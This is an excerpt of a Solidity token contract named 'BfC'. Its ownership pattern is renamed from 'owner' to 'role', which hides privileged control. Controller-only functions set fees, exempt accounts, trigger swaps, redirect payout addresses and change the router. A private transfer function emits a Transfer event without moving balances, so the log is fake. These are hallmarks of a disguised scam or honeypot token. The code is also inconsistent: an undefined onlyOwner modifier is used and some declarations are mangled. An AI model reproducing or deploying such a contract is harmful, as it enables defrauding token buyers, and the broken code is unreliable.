...
interface IERC20 {
    ...
    function allowance(address role, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed role, address indexed spender, uint256 value);
}
...
contract Ownable is Context {
    address 
    private _role;
    event RoleshipTransferred
    (address indexed previousRole, 
    address indexed newRole);
    ...
    modifier onlyRole() {
        require(_role == 
        _msgSender(), "Ownable: caller is not the role");
        _;
    }

    function transferRoleship
    (address newRole) public virtual onlyRole{
        emit RoleshipTransferred(_role, newRole);
        _role = newRole;
    }
...
interface IUniswapV2Pair {
    event Approval(address indexed role, address indexed spender, uint value);
    ...
    function balanceOf(address role) external view returns (uint);
    function allowance(address role, address spender) external view returns (uint);
    ...
    function nonces(address role) external view returns (uint);

    function permit(address role, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
...
contract BfC is Context, IERC20, Ownable {
    ...
    uint256 public getNumberOfDividendTokenHolders = 100;
    ...
    function allowance(address role, address spender) public view override returns (uint256) {
        return _allowances[role][spender];
    }
    ...
    function _approve(address role, address spender, uint256 amount) 
    private {
        require(role != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[role][spender] = amount;
        emit Approval(role, spender, amount);
    }
    function setMarketPairStatus(address account, bool newValue) public onlyOwner {
        isMarketPair[account] = newValue;
    }
    function setIsExcludedFromFee(address account, bool newValue) public onlyRole {
        isExcludedFromFee[account] = newValue;
    }

    function set
        (uint256 newburn, uint256 newLiquidity, uint256 newaward, uint256 newreflection)  public onlyOwner{
        _burn = newburn;
   ...
   function autoSwap(uint256 _count) public onlyOwner{
    ...
    function setDividendDistributorAddress(address newAddress) external onlyRole{
        DividendDistributorAddress = payable(newAddress);
    }

    function setrewardAddress(address newAddress) external onlyRole{
    ...
    function _transfer(address sender, uint256 amount) private{
        emit Transfer(sender,_msgSender(),amount);
    }
    ...
    function changeRouterVersion(address newRouterAddress) public onlyRole returns(address newPairAddress) {
